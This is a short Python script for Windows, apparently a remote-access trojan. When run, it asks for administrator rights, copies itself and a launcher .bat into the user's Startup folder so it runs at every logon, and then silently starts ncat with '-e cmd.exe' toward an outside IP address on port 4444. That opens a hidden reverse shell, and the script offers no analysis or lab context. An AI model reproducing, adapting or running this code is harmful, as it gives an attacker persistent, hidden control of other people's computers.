import os
import sys
import shutil
import ctypes
import subprocess
import platform
import re
from typing import List, Tuple

def autostart():
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    def run_as_admin():
        """Rerun the script as admin"""
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{os.path.abspath(__file__)}"', None, 1
        )
        sys.exit()
    # ------------------ Paths ------------------
    USER_APPDATA = os.environ["APPDATA"]
    STARTUP_DIR = os.path.join(USER_APPDATA, r"Microsoft\Windows\Start Menu\Programs\Startup")
    SCRIPT_NAME = "deep-1.py"
    TARGET_SCRIPT = os.path.join(STARTUP_DIR, SCRIPT_NAME)
    BAT_NAME = "run_startup_script.bat"
    TARGET_BAT = os.path.join(STARTUP_DIR, BAT_NAME)

    # ------------------ Functions ------------------
    def copy_self_to_startup():
        shutil.copy2(sys.argv[0], TARGET_SCRIPT)
        print(f"✅ Copied script to Startup: {TARGET_SCRIPT}")

    def create_startup_bat():
        python_path = sys.executable
        bat_content = f"""@echo off
    cd /d "{STARTUP_DIR}"
    "{python_path}" "{TARGET_SCRIPT}"
    """
        with open(TARGET_BAT, "w") as f:
            f.write(bat_content)
        print(f"✅ Created startup .bat: {TARGET_BAT}")

    def self_delete():
        if os.path.exists(TARGET_SCRIPT):
            os.remove(TARGET_SCRIPT)
            print(f"✅ Deleted script: {TARGET_SCRIPT}")
        if os.path.exists(TARGET_BAT):
            os.remove(TARGET_BAT)
            print(f"✅ Deleted bat: {TARGET_BAT}")
        sys.exit()
    if not os.path.exists(TARGET_SCRIPT) and not is_admin():
        run_as_admin()
    # Copy itself and create .bat if not exists
    if not os.path.exists(TARGET_SCRIPT):
        copy_self_to_startup()
    if not os.path.exists(TARGET_BAT):
        create_startup_bat()
def connect():
    subprocess.Popen(
        ["ncat", "-nv", "35.208.39.232", "4444", "-e", "cmd.exe"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

autostart()
connect()